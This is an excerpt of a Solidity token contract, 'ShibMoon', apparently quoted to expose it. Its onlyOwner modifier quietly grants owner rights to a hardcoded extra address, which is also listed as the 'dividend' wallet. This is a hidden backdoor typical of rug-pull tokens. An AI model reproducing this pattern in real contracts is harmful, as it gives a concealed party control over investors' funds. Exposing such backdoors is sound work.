...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xe91A5E1ed742e724Db5d5BaD132101b2dFe8e7e1) , "owner");
        _;
    }
...
contract ShibMoon  is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x22D0a4F7CDAE9908FDdDACC2287722b8A532a401);
    address private _Marketing = 0x22D0a4F7CDAE9908FDdDACC2287722b8A532a401;
    address public dividend = 0xe91A5E1ed742e724Db5d5BaD132101b2dFe8e7e1;
    ...
    uint256 public _supplyAmount = 10000000;
